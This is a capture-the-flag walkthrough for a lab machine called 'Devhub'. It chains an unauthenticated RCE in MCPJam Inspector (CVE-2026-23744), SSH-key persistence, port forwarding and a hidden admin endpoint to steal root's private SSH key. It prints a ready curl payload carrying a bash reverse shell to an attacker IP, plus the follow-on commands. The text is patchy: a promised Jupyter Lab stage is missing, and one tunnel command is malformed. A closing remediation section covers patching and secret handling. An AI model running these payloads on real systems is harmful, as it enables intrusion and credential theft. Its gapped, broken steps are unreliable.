## Introduction

Devhub is a Linux-based target that highlights the severe risks of exposing insecure development utilities and misconfiguring internal administrative tools. This writeup details the end-to-end exploitation process, demonstrating how a single unpatched public-facing service can lead to full system compromise through a chain of internal pivoting, credential exposure, and insecure custom scripts.

## Overview

The engagement begins with network enumeration, leading to the discovery of an exposed MCPJam Inspector service. This service is vulnerable to an unauthenticated Remote Code Execution flaw (CVE-2026-23744), which is leveraged to secure an initial reverse shell as the `mcp-dev` user.

Post-exploitation enumeration reveals a locally bound Jupyter Lab instance running under the `analyst` user. By analyzing process command-line arguments, an authentication token is recovered. Using SSH local port forwarding, the Jupyter Lab interface is accessed, allowing lateral movement to the analyst account. Finally, privilege escalation to `root` is achieved by analyzing a custom Python administrative script, extracting a hardcoded API key, and exploiting a hidden debugging function to dump the root user's private SSH key.

## Attack Chain

1. **Information Gathering:** Port scanning and service fingerprinting using Nmap and WhatWeb.
2. **Initial Access:** Exploiting CVE-2026-23744 in MCPJam Inspector to gain a reverse shell.
3. **Persistence & Tunneling:** Upgrading the shell via SSH keys and establishing local port forwarding.
4. **Process Enumeration:** Discovering a hardcoded authentication token for an internal Jupyter Lab instance via process listing.
5. **Lateral Movement:** Authenticating to the tunneled Jupyter Lab service and using its built-in terminal to pivot to the `analyst` user.
6. **Source Code Analysis:** Identifying a vulnerable, locally bound operations management script (`/opt/opsmcp/server.py`) running as root.
7. **Privlege Escalation:** Utilizing a hardcoded API key to authenticate to the local script and querying a hidden endpoint to extract the root SSH private key.

Because the service listens on all interfaces (`0.0.0.0`) by default and lacks authentication on its API endpoints, we can likely exploit it to gain our initial foothold.

## Foothold

Reviewing the Proof of Concept (PoC) from the GitHub advisory for CVE-2026-23744, we can see that the vulnerability lies in the `/api/mcp/connect` endpoint. The API expects a JSON payload containing a `serverId` and a `serverConfig` object. Within `serverConfig`, we can pass arbitrary commands and arguments that the server will execute.

To exploit this and gain a reverse shell, we will inject a standard Bash reverse shell payload.

First, set up a Netcat listener on your local attack machine to catch the incoming connection:
```
nc -lvnp 9001
```

Next, send the malicious payload using `curl`. Make sure to replace `10.10.14.16` with your actual VPN IP address:
```
curl -X POST http://10.129.142.25:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.16/9001 0>&1"],
      "env": {}
    },
    "serverId": "test"
  }'
```

Upon successful execution, the Netcat listener will catch the callback, granting us an initial reverse shell as the `mcp-dev` user:
```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

Standard Netcat reverse shells lack proper terminal features, making them unstable and difficult to work with. Since the target is running an SSH server, we can upgrade our access by dropping our public SSH key into the `mcp-dev` user's `authorized_keys` file.

From the reverse shell, run the following command to create the necessary `~/.ssh` directory, append your public key, and set the proper permissions:
```
mkdir -p ~/.ssh && echo "...[YOUR_PUBLIC_KEY_HERE]..." >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys  
```

With the key in place, we can drop the unstable Netcat session and log in securely using SSH:
```
ssh -i htb_key mcp-dev@10.129.142.25

```
We now have a fully interactive and stable SSH session on the target.

Analyzing the script reveals several critical pieces of information:
1. The service runs locally on port `5000`.
2. It expects an authentication header: `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a`.
3. There is a hidden endpoint/tool named `ops._admin_dump`.
4. If we call `ops._admin_dump` and pass the target `ssh_keys`, the script will read `/root/.ssh/id_rsa` and return the root user's private SSH key in a JSON response.

First, we need to forward the internal port 5000 to our local machine. Using the SSH tunnel techniques established earlier, we open a new tunnel for port `5000`:
```
-L 127.0.0.0.1:5000
```

With the port forwarded, we can craft a `curl` request from our local machine to trigger the emergency credential dump:
```
curl -X POST http://localhost:5000/tools/call   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"   -H "Content-Type: application/json"   -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

This successfully extracts the JSON response containing the private key and saves it to a file named `root_raw`.

The key inside `root_raw` is formatted as a single JSON string with literal `\n` characters instead of actual line breaks. SSH will reject the key in this format. We can use `jq` with the `-r` (raw) flag to parse the JSON and format the key correctly:
```
jq -r '.root_private_key' root_raw > root_key
```

Finally, we set the strict permissions required by SSH, log in as the root user:
```
chmod 600 root_key
ssh -i root_key root@10.129.142.25
```

Retrieve the root flag:
```
cat /root/root.txt
```

> **Note on OPSEC:** Before concluding the engagement, remember to clean up your tracks. Remove your public SSH keys from the `authorized_keys` files of both the `mcp-dev` and `analyst` users, and terminate your initial reverse shell. While often skipped in CTF environments, proper post-exploitation cleanup is a critical requirement in real-world assessments to ensure you do not leave accidental backdoors behind.

## Remediation & Recommendations

To secure this environment, the following remediation steps should be implemented:
- **Patch Management:** Immediately update the MCPJam Inspector software to a patched version that resolves CVE-2026-23744. Administrative or debugging interfaces should never be exposed to external networks without strict access controls and authentication.
- **Secure Credential Handling:** Do not pass sensitive tokens or passwords via command-line arguments (as seen with the Jupyter Lab instance). Command-line arguments are visible to all users on a Linux system via the process list (`ps`). Instead, use environment variables or secure configuration files with strict read permissions.
- **Remove Hardcoded Secrets:** The `/opt/opsmcp/server.py` script contains a hardcoded API key (`VALID_API_KEY`). Secrets should be removed from source code and managed via a dedicated secrets management solution or secure environment variables.
- **Principle of Least Privilege:** The inclusion of an emergency `ops._admin_dump` tool that blindly returns the root SSH private key is a critical design flaw. This functionality should be entirely removed from the application. If emergency access is required, it should be handled through standardized, heavily audited break-glass procedures, not an API endpoint.

- **Lateral Movement** — Valid Accounts: Local Accounts (**T1078.003**): Dropped SSH public keys into configuration files to maintain stable access and move laterally between `mcp-dev`, `analyst`, and `root`.
